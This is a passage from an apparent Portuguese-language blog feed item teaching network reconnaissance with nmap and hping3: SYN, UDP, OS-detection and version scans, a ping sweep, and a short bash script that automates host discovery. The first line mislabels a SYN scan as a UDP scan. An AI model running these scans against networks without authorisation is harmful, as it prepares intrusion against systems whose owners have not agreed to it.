nmap -sS 192.168.1 Realiza uma varredura UDP. Como o UDP não usa um handshake, um serviço escutando uma porta UDP pode não enviar nenhuma resposta. As portas que enviam uma resposta são exibidas como abertas. -sU (varredura UDP).
nmap -sU 192.168.1.50 Ativa a detecção do SO.
nmap -O 192.168.1.50 Quantos hosts ativos.
nmap -sP 192.168.1.0/24 Script para automatizar o processo de Scan em hosts ativos, pode personalizar com suas flags favoritas.
# nano maroto_scan.sh
#!/bin/bash echo &amp;#34;Insira o Range:&amp;#34; read RANGE nmap -sP $RANGE | grep for | cut -d &amp;#34; &amp;#34; -f5 echo &amp;#34;Isso aê&amp;#34; Para tornar executável o script faça:
# chmod &#43;x maroto_scan.sh &amp;gt;&amp;gt;Resumo Porta aberta = SYN &#43; ACK Porta Fechada = RST # hping3 --syn -c 1 -p 80 sitedeteste.com SYN ACK = Flag:SA # hping3 --syn -c 1 -p 8000 192.168.0.11 RST = Flag:RA ( reset ack ) # nmap -sS -p 80 192.168.0.113 (sem ruidos) # nmap -sV -p 80 192.168.0.113 (versoes dos serviços, porém bem barulhento) # nmap -A 192.168.0.113 (full scan, ele vai utilizaar recursos do NMAP para filtrar o maxímo que conseguir) ]]></content:encoded>
    </item>
  </channel>
</rss>
